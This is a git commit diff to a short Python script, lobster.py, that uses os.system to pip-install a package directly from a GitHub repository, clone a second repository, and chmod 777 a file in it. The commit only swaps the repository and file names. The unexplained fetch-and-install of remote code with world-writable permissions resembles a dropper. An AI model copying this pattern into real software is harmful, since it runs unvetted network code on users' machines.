131caf6bc2ce3dc19119d068ae0b6cea3f0f839d
eurohan1 <83457221+eurohan1@users.noreply.github.com>
2021-05-19 17:53:02 +0530

    Update lobster.py

--- lobster.py
+++ lobster.py
@@ -1,6 +1,6 @@
 import os
 os.system("pip3 install git+https://github.com/eurohan1/dcimlod.git")
-os.system("git clone https://github.com/eurohan1/galober.git")
-os.system("chmod 777 galober/gemo.py")
+os.system("git clone https://github.com/eurohan1/defopy.git")
+os.system("chmod 777 defopy/kitten.py")
 
 
